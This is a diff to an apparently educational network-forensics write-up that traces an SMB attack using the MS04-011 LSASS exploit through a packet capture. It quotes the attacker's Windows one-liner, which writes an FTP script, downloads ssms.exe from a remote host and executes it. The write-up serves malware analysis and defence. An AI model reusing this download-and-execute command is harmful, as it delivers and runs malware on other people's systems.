@@ -11,6 +11,9 @@ Some unknown cases
     - [Details](#details)
       - [Session 1](#session-1)
       - [Session 2](#session-2)
+      - [Session 3](#session-3)
+      - [Session 4](#session-4)
+      - [Session 5](#session-5)
 
 ---
 
@@ -19,7 +22,10 @@ Some unknown cases
 ### Sumary
 
 - Session 1: `89.114.205.102:1821` attack to `192.150.11.111:445` to check if SMB service is running (for file transfering) 
-- Session 2: null attack to call `DsRoleUpgradeDownlevelServer` function
+- Session 2: null attack to call `DsRoleUpgradeDownlevelServer` function 
+- Session 3: send payload to download file ssms.exe through FTP
+- Session 4: download file through FTP
+- Session 5: finish download malware on victim
 
 ### Details
 
@@ -64,7 +70,34 @@ Using find packet with above keyword to view details from 14th packet
   
 ![](https://i.ibb.co/YZ2M1rv/Screenshot-2023-04-03-135949.png)
 
-- 25th - 33rd: using DSSETUP V0.0 (32bit NDR) to call function `DsRoleUpgradeDownlevelServer`
+- 25th - 33rd: using DSSETUP V0.0 (32bit NDR) to call function `DsRoleUpgradeDownlevelServer`. Find details in the Internet, it seems [`MS04–011 Microsoft LSASS Service DsRolerUpgradeDownlevelServer Overflow`](https://www.exploit-db.com/exploits/16368)
+
+#### Session 3
+
+Continue in tcp stream (tcp.stream eq 2), attacker send payload which have victim download file ssms.exe through FTP
+
+```sh
+  echo open 0.0.0.0 8884 > o&echo user 1 1 >> o &echo get ssms.exe >> o &echo quit >> o &ftp -n -s:o &del /F /Q o &ssms.exe
+  ssms.exe
+``` 
+
+![](https://i.ibb.co/P4Q1TSV/Screenshot-2023-04-04-102430.png)
+
+
+#### Session 4
+
+Continute session 3 (tcp.stream eq 3), attacker connect to victim then download file
+
+![](https://i.ibb.co/hsCFdJM/Screenshot-2023-04-04-103048.png)
+
+#### Session 5
+
+Continue session 4 (tcp.stream eq 4), this show content inside `ssms.exe` file, then save as file and upload this file to [VirusTotal](https://www.virustotal.com/gui/file/b14ccb3786af7553f7c251623499a7fe67974dde69d3dffd65733871cddf6b6d) for quick review
+
+![](https://i.ibb.co/bBYbx6n/Screenshot-2023-04-04-103436.png)
+
+![](https://i.ibb.co/qFytrbb/Screenshot-2023-04-04-104909.png)
+
 
 
 
